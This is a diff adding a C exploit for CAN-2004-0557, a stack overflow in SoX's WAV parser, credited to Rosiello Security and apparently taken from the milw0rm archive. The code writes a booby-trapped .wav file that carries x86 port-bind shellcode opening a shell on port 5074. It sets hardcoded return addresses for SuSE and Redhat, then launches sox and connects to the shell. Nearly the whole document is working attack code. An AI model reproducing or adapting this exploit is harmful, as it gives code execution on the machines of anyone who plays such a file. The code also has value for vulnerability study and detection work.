@@ -1,0 +1,320 @@
+//--------------------------------- Begin Code: sox-exploiter.c ---------------------------------
+/*
+
+
+  Copyright Rosiello Security 2004
+               http://www.rosiello.org
+
+
+CVE Reference: CAN-2004-0557
+Bug Type: Stack Overflow
+Date: 01/08/2004
+
+
+Ulf Harnhammar reported that there are two buffer overflows in the 'sox' and 'play' commands.
+The flaws reside in the st_wavstartread() function in 'wav.c', where the function reads data
+based on a user-supplied size variable into a buffer without checking to see if the specified
+amount of data will fit into the buffer.
+
+The report indicates that older versions, including 12.17.1, 12.17 and 12.16, are not affected.
+
+Vendors were reportedly notified on July 18, 2004.
+Impact: A remote user can create a WAV file that, when processed by the target user, will execute
+arbitrary code on the target system with the privileges of the SoX process.
+Solution: No vendor solution was available at the time of this entry.
+
+**************************************************************************************************
+!!! DO NOT USE THIS SOFTWARE TO BREAK THE LAW !!!
+
+This exploit will create a malevolent .wav file that will execute the shellcode (it's a
+port_bind() opening the port 5074)
+Example:
+$./sox-exploiter laser.wav malevolent.wav 0
+When you play the file malevolent.wav the shellcode is executed.
+
+AUTHOR: rave --> rave@rosiello.org
+AUTHOR: Angelo Rosiello --> angelo@rosiello.org
+WEB : http://www.rosiello.org
+*/
+
+
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/types.h>
+
+ /* used for stating */
+#include <sys/types.h>
+#include <sys/stat.h>
+
+/* used for mmap */
+#include <sys/mman.h>
+
+/* perror() */
+#include <errno.h>
+
+/* strstr */
+#include <string.h>
+
+
+enum { suse, redhat, slackware };
+
+
+struct tr
+{
+  char *OS;
+  unsigned long ret;
+  } target [] = {
+
+     "SuSe 9.1 Pro",
+     0xbfffe9f0,
+
+
+     "Redhat 9.1",
+     0x41414141
+   };
+
+signed char
+shellcode[]=
+ "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+
+/*
+ * s0t4ipv6@Shellcode.com.ar
+ * x86 portbind a shell in port 5074
+ * 92 bytes.
+ */
+
+"\x31\xc0" // xorl %eax,%eax
+"\x50" // pushl %eax
+"\x40" // incl %eax
+"\x89\xc3" // movl %eax,%ebx
+"\x50" // pushl %eax
+"\x40" // incl %eax
+"\x50" // pushl %eax
+"\x89\xe1" // movl %esp,%ecx
+"\xb0\x66" // movb $0x66,%al
+"\xcd\x80" // int $0x80
+"\x31\xd2" // xorl %edx,%edx
+"\x52" // pushl %edx
+"\x66\x68\x13\xd2" // pushw $0xd213
+"\x43" // incl %ebx
+"\x66\x53" // pushw %bx
+"\x89\xe1" // movl %esp,%ecx
+"\x6a\x10" // pushl $0x10
+"\x51" // pushl %ecx
+"\x50" // pushl %eax
+"\x89\xe1" // movl %esp,%ecx
+"\xb0\x66" // movb $0x66,%al
+"\xcd\x80" // int $0x80
+"\x40" // incl %eax
+"\x89\x44\x24\x04" // movl %eax,0x4(%esp,1)
+"\x43" // incl %ebx
+"\x43" // incl %ebx
+"\xb0\x66" // movb $0x66,%al
+"\xcd\x80" // int $0x80
+"\x83\xc4\x0c" // addl $0xc,%esp
+"\x52" // pushl %edx
+"\x52" // pushl %edx
+"\x43" // incl %ebx
+"\xb0\x66" // movb $0x66,%al
+"\xcd\x80" // int $0x80
+"\x93" // xchgl %eax,%ebx
+"\x89\xd1" // movl %edx,%ecx
+"\xb0\x3f" // movb $0x3f,%al
+"\xcd\x80" // int $0x80
+"\x41" // incl %ecx
+"\x80\xf9\x03" // cmpb $0x3,%cl
+"\x75\xf6" // jnz <shellcode+0x40>
+"\x52" // pushl %edx
+"\x68\x6e\x2f\x73\x68" // pushl $0x68732f6e
+"\x68\x2f\x2f\x62\x69" // pushl $0x69622f2f
+"\x89\xe3" // movl %esp,%ebx
+"\x52" // pushl %edx
+"\x53" // pushl %ebx
+"\x89\xe1" // movl %esp,%ecx
+"\xb0\x0b" // movb $0xb,%al
+"\xcd\x80" // int $0x80
+;
+
+signed long shelladdr =0xbfffe9f0;//0xbfffe9d8;//0xbffff3ea;
+
+char *memap;
+char *fs_io(char *filename, char *data, mode_t flags, long *size)
+{
+struct stat status;
+int fd;
+
+if ( data == NULL) {
+
+if ( lstat (filename,&status) < 0)
+{
+ printf("Input File not found\n");
+ exit(-1);
+}
+
+if ((fd=open ( filename , flags,0666)) == -1) {
+  perror("open");
+  exit (-1);
+  }
+
+   memap=mmap(0,status.st_size,PROT_READ|PROT_WRITE,MAP_PRIVATE,fd,0);
+
+  if ( memap == NULL)
+   {printf("allocation problem\n"); exit (-1);}
+
+   (*(long *)size) = status.st_size;
+   return (char *)memap;
+  }
+
+
+}
+
+
+int connect_to( char *addr)
+{
+struct sockaddr_in sin4;
+int sock;
+char in [512];
+char out [512];
+char banner[512];
+size_t size;
+
+   sin4.sin_family = AF_INET;
+   sin4.sin_addr.s_addr = inet_addr(addr);
+   sin4.sin_port = htons(5074);
+
+   sock=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+   if (!sock)
+   {
+     return -1;
+   }
+
+  if (connect (sock,(struct sockaddr *)&sin4,sizeof(struct sockaddr_in)) ==-1)
+  {
+
+    return -1;
+    }
+
+    printf("[+] Exploit success\n");
+    size=sprintf(banner,"%s","uname -a;\n");
+    write ( sock, banner, size );
+
+    while ( 1 )
+    {
+    size=read (sock,in,sizeof(in));
+    in[size] = '\0';
+    printf("%s\n",in);
+
+
+    scanf("%s",&out);
+    strcat(out,"\n");
+
+    write (sock, out,strlen(out));
+    memset(in,'\0',sizeof(in));
+    memset(out,'\0',sizeof(out));
+    }
+
+
+}
+
+void usage(char *file)
+{
+int i;
+printf("USAGE:\n");
+printf("SoX Exploiter by Rosiello Security\n");
+printf("%s source.wav vulnerable.wav target\n", file);
+for (i=0;i < 2;i++)
+printf("TARGET: %d %s %x\n",i,target[i].OS,target[i].ret);
+exit(0);
+}
+
+
+int main(int argc, char **argv)
+{
+
+  char *ptr,*tmp;
+  int fd,count;
+  long sizefield,sizeloc;
+  int size;
+  char payload[500];
+  pid_t pid;
+  int opt;
+  if ((argc) != 4)
+    usage(argv[0]);
+  opt=atoi(argv[3]);
+
+  memap = fs_io(argv[1],NULL,O_RDWR,&size);
+
+  printf("[+] Sox Exploiter by Rosiello Security\n");
+  printf("[+] Opened %s size : %d\n",argv[1],size);
+
+
+  ptr = memap;
+  count =0;
+  do
+  {
+   ptr++;
+   if ((strncmp("INFOICRD",ptr,8)==0)) break;
+
+  } while ( (count ++ !=size) );
+
+  tmp = (char *)malloc ( size + 512);
+  tmp = memap;
+
+  ptr +=8;
+  sizefield = (long) ptr[0];
+  sizeloc = (long) (count + 8)+1;
+
+  tmp[sizeloc]=01;
+  tmp[sizeloc+1]=02;
+
+  if ((fd=open ( argv[2] , O_WRONLY | O_CREAT | O_TRUNC,0666)) == -1) {
+   perror("open");
+   return -1;
+  }
+
+  sizeloc +=2;
+  write(fd,tmp,sizeloc);
+
+  memset(payload,0x2e,318);
+
+  size=sprintf(payload+318,"%s%s",((char *)&target[opt].ret),shellcode);
+
+
+  write (fd,payload,sizeof(payload));
+  close(fd);
+
+  size = 0x0102 - size;
+
+  printf("[+] Coded by rave & Angelo Rosiello\n");
+  printf("[+] Writing evil code into %s\n", argv[2]);
+  printf("[+] Org sizefield = %d new sizefield = %d\n",sizefield,0x0102);
+  printf("[+] Overflowing the buffer with %d Bytes\n",size);
+  printf("[+] Executing /usr/bin/sox\n");
+  printf("[+] Connecting to localhost\n");
+
+  pid = fork();
+  if (pid ==0) {
+    execl("/usr/bin/sox","sox",argv[2],"-t","ossdsp","/dev/dsp" ,NULL);
+
+   };
+
+  sleep(1);
+  if ((connect_to("127.0.0.1")) <0)
+    printf("[-] Exploit failed\n");
+
+  return EXIT_SUCCESS;
+}
+//---------------------------------- End Code: sox-exploiter.c ----------------------------------
+
+// milw0rm.com [2004-08-04]
